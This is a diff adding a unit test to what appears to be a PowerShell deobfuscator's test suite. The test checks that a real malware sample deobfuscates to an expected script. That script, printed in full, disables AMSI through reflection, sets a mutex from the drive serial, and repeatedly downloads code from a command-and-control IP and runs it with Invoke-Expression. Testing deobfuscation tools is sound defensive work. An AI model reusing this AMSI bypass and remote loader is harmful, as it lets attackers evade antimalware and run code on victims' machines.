@@ -807,3 +807,39 @@ class TestPs1RealWorldLarge(TestUnitBase):
 
         test = data | self.load() | str
         self.assertIn(goal, test)
+
+    def test_script_requiring_better_bloat_detection(self):
+        data = self.download_sample('baa48c748d58d0c715fc2b7fbe74610213c070814762a2774cc6d57d4522a73d')
+        test = data | self.load() | str
+        goal = inspect.cleandoc(
+            r"""
+            try {
+              [ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($Null, $True)
+            } catch {}
+            $fso = New-Object -Com "Scripting.FileSystemObject"
+            $SerialNumber = $fso.GetDrive("c:\").SerialNumber
+            $SerialNumber = "{0:X}" -f $SerialNumber
+            $SerialNumber = [Convert]::ToInt64($SerialNumber, 16)
+            $serial = $SerialNumber
+            $mutex = New-Object System.Threading.Mutex ($False, $serial)
+            $mutexFree = $mutex.WaitOne(1)
+            if (!$mutexFree) {
+              exit
+            }
+            $url = "http://[[C2]]/${serial}"
+            $s = New-Object System.Net.WebClient
+            while ($True) {
+              try {
+                $result = $s.DownloadString($url)
+              } catch {
+                Start-Sleep -s 25
+                continue
+              }
+              Invoke-Expression $result
+              Start-Sleep -s 25
+            }
+            $mutex.ReleaseMutex()
+            $mutex.Dispose()
+            """
+        ).replace('[[C2]]', '62''.60''.178.24')
+        self.assertEqual(test, goal)
